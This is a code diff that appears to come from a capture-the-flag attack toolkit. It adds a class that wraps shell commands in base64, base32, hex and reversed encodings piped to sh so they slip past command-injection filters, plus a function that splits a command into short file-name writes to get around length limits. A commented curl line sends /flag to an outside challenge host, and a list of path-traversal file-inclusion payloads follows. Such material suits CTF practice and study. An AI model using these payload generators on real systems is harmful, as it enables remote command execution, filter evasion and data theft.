@@ -2,6 +2,80 @@ import requests
 import threading
 from authlib.jose import jwt
 import tqdm
+import base64
+import base64
+class linux_rce:
+    pl=""
+    def __init__(self,strpl):
+        self.pl=strpl
+    def __str__(self):
+        return self.pl
+    def space(self,rep='$IFS$9'):
+        self.pl=self.pl.replace(' ',rep)
+        return self
+    def base64(self,run="|sh"):
+        b64=base64.b64encode(self.pl.encode()).decode()
+        self.pl='echo '+b64+"|base64 -d"+run
+        return self
+    def base64_print(self,run="|sh"):
+        b64=base64.b64encode(self.pl.encode()).decode()
+        self.pl='printf '+b64+"|base64 -d"+run
+        return self
+    def base32(self,run="|sh"):
+        b64=base64.b32encode(self.pl.encode()).decode()
+        self.pl='echo '+b64+"|base64 -d"+run
+        return self
+    def base32_print(self,run="|sh"):
+        b64=base64.b32encode(self.pl.encode()).decode()
+        self.pl='printf '+b64+"|base64 -d"+run
+        return self
+    def xxd(self,run="|sh"):
+        b16 = base64.b16encode(self.pl.encode()).decode()
+        self.pl='echo '+b16+"|xxd -r -p"+run
+        return self
+    def xxd_print(self,run="|sh"):
+        b16 = base64.b16encode(self.pl.encode()).decode()
+        self.pl='printf '+b16+"|xxd -r -p"+run
+        return self
+    def rev_print(self,run="|sh",res='$IFS$9'):
+        self.pl=self.pl.replace(' ',res)[::-1].replace("$", "\\$")
+        self.pl='printf '+self.pl+'|rev'+run
+        return self;
+
+''' #接收
+shell = "curl -F file=@/flag http://297a1db9-a9a0-4915-8015-5d32b3f0923d.challenge.ctf.show"
+move_uploaded_file($_FILES['file']['tmp_name'],'txt');
+echo file_get_contents('txt');
+'''
+
+def makshell_7(shell):
+    import base64 
+    shellb = base64.b64encode(shell.encode()).decode()
+    while shellb[-1]=='=':
+        shell +=' '
+        shellb = base64.b64encode(shell.encode()).decode()
+    
+    shell = f'echo {shellb}|base64 -d>1'
+    print(shell)
+    def addslash(shell ,chrs="\\ $+'|>\""):
+        for i in chrs:
+            shell=shell.replace(i, '\\'+i)
+        return shell
+    shell = addslash(shell)
+    slist=['sh 1','sh 0','ls -t>0']
+    tmp = '>'
+    for i in range(len(shell)) :
+        if (len(shell)>i+1 and shell[i+1]== '\\') or len(tmp) >= 4:
+            slist.append(tmp+shell[i]+r'\\')
+            tmp='>'
+        else:
+            tmp += shell[i]
+    else:
+        if '>' == tmp :
+            slist[-1]=slist[-1][:-2]
+        else :
+            slist.append(tmp)
+    return slist[::-1]
 
 PL_include = {'/etc/pure-ftpd/pure-ftpd.pdb', '/var/www/log/error_log',
               '../../../../../../../../../proc/self/environ%00', '/etc/ppp/options.xl2tpd.bak',
